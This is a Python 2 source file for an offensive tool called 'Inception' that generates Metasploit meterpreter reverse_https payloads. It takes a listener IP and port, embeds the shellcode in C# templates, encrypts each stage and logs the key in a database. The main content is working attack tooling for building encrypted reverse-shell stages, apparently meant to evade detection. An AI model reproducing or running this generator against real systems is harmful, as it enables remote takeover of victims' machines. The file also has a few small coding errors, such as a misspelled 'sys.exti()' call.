import os
import sys
import readline
import uuid
from os.path import expanduser
from colorama import Style, Fore
from Classes.shellcode_msf import create_shellcode
from Classes.Crypto_Handler import *
from Classes.Template_Builder import *
from Classes.Setup import *
from Classes.DB import *

#config
msfroot = '/usr/bin' # change this as required
home = expanduser("~")
path_root = home + '/.inception/'
path_payload_enc = path_root + 'payloads/'
path_payload_raw = path_root + 'payloads_raw/'

#globals
menu_actions = {}

#===================
#Menu Functions
#===================


#header
def print_header():
	print(" _____ _   _ _____  ___________ _____ _____ _____ _   _ ")
	print("|_   _| \ | /  __ \|  ___| ___ \_   _|_   _|  _  | \ | |")
	print("  | | |  \| | /  \/| |__ | |_/ / | |   | | | | | |  \| |")
	print("  | | | . ` | |    |  __||  __/  | |   | | | | | | . ` |")
	print(" _| |_| |\  | \__/\| |___| |     | |  _| |_\ \_/ / |\  |")
	print(" \___/\_| \_/\____/\____/\_|     \_/  \___/ \___/\_| \_/")
	print("")
	print("'You mean, a dream within a dream?'")
	print ("")

def print_help():
	print "Shellcode payloads use meterpreter reverse_https payloads"
	print "The following values are required:\n"
	print "lhost - the IP address of the metasploit listener"
	print "lport - the port to listen on"
	print "architecture - either x64 (for 64 bit systems) or x86 (for 32 bit systems)"
	print "relative path to the template file (/templates/<template>.txt)"
	print ""
	print ""
	print "Custom templates allow arbitrary C# code to be executed"
	print "Only the relative path to the template file is required"

#Main Menu
def main_menu():
	print "Select payload type:"
	print "1. Shellcode"
	print "2. Custom"
	print "3. Help"
	print "0. Quit"
	choice = raw_input(" >>  ")
	exec_menu(choice)

#Execute menu
def exec_menu(choice):
	ch = choice.lower()
	if ch == '':
		menu_actions['main_menu']()
	else:
		try:
			menu_actions[ch]()
		except KeyError:
			print Fore.RED + "Invalid selection, please try again"
			menu_actions['main_menu']()

#shellcode menu (menu 1)
#need to capture lhost, lport, arch and template here
def menu1():
	print "\nSelect archetecture\n"
	print "1. x86"
	print "2. x64"
	choice = raw_input(" >> ")
	if choice == '1':
		arch = "x86"
	elif choice == '2':
		arch = "x64"
	else:
		print Fore.RED + "Invalid selection, please try again"
		menu_actions['menu1']()
	print "\nEnter lhost value \n"
	lhost = raw_input(" >> ")
	print "\nEnter lport value \n"
	lport = raw_input(" >>" )
	print "\nEnter relative path to template file"
	template_rel_path = raw_input(" >> ")
	print "\nSelect action\n"
	print "1. Generate"
	print "2. Cancel"
	choice = raw_input(" >> ")
	if choice == '1':
		Shellcode_Payload(lhost, lport, arch, template_rel_path)
	else:
		menu_actions['main_menu']()

#Custom menu (menu 2)
#only need the template file here
def menu2():
	print "\nEnter relative path to template file"
	template_rel_path = raw_input(" >> ")
	print "\nSelect action\n"
	print "1. Generate"
	print "2. Cancel"
	choice = raw_input(" >> ")
	if choice == '1':
		Custom_Payload(template_rel_path)
	else:
		menu_actions['main_menu']()

#Help menu (menu 3)
#just back as an option
def menu3():
	print_help()
	print "Press any key to return to the main menu."
	choice = raw_input(" >> ")
	menu_actions['main_menu']()
	
def exit():
	sys.exit()

#===================
#Menu Definitions
#===================
menu_actions = {
    'main_menu': main_menu,
    '1': menu1,
    '2': menu2,
    '3': menu3,
    '0': exit,
}

#overload print method to reset the colours, colorama Init() does not play well with tab completion >.<
def print_normal(string):
	print Style.RESET_ALL + string

#===================
#Payload Generation
#===================
def Shellcode_Payload(lhost, lport, arch, template_rel_path):
	try:
		print Fore.YELLOW + "[*] LHOST set to " + lhost
		print Fore.YELLOW + "[*] LPORT set to " + lport
		print Fore.YELLOW + "[*] arch set to " + arch
		print Fore.YELLOW + "[*] Building shellcode" + Style.RESET_ALL
		shellcode = create_shellcode(msfroot, lhost, lport, arch)
		print_normal("[*] Shellcode generated")
		print Fore.YELLOW + "[*] Using template " + template_rel_path
		print Fore.YELLOW + "[*] Generating raw stage from template"
		#Pass the base DIR of the script, avoids issues with TemplateBuilder.py using /Classes/ in the path
		template = BuildTemplate(shellcode, template_rel_path, os.path.dirname(__file__))
		file_name = str(uuid.uuid4())
		WriteFile(path_payload_raw + file_name, template)
		print_normal("[*] stage written to " + path_payload_raw)
		print Fore.YELLOW + "[*] Generating Encrypted stage"
		key = GenerateKey()
		stage_enc = Encrypt(key, template)
		WriteFile(path_payload_enc + file_name, stage_enc)
		Insert_Payload(key, path_payload_enc + file_name, 1)
		print_normal("[*] Encrypted stage written to " + path_payload_enc + file_name)
		print_normal("[*] Key value: " + key)
		menu_actions['main_menu']()
		
	except:
		print Fore.RED + "Error creating payload. Returning to menu..." + Style.RESET_ALL
		exec_menu('1')

def Custom_Payload(template_rel_path):
	try:
		print Fore.YELLOW + "[*] Using template " + template_rel_path
		print Fore.YELLOW + "[*] Generating Encrypted stage"
		key = GenerateKey()
		template = BuildCustomTemplate(template_rel_path, os.path.dirname(__file__))
		stage_enc = Encrypt(key, template)
		file_name = str(uuid.uuid4())
		WriteFile(path_payload_enc + file_name, stage_enc)
		Insert_Payload(key, path_payload_enc + file_name, 1)
		print_normal("[*] Encrypted stage written to " + path_payload_enc + file_name)
		print_normal("[*] Key value: " + key)
		menu_actions['main_menu']()
	except:
		print Fore.RED + "Error creating payload. Returning to menu..." + Style.RESET_ALL
		raise
		exec_menu('2')

#===================
#Install checks
#===================
def Check_Installed():
	if not Check():
		print Fore.RED + "Directory structure not present. Attempting to create..." + Style.RESET_ALL
		try:
			Create()
		except:
			print Fore.RED + "Unable to create directory structure!"
			print Fore.RED + "Please check you have appropriate permissions to write to ~/"
			print Fore.RED + "Inception will now exit..." + Style.RESET_ALL
			sys.exit()
		print "[*] Directory structure created."
	if not Check_DB_Exists():
		print Fore.RED + "Database not initialised. Attempting to create..." + Style.RESET_ALL
		try:
			Create_Schema()
		except:
			print Fore.RED + "Error initialising database."
			print Fore.RED + "Inception will now exit..." + Style.RESET_ALL
			sys.exti()
		print "[*] Database initialised."
	print "[*] Initial setup complete!" 

readline.set_completer_delims('\t')
readline.parse_and_bind("tab: complete")
print_header()
Check_Installed()
main_menu()

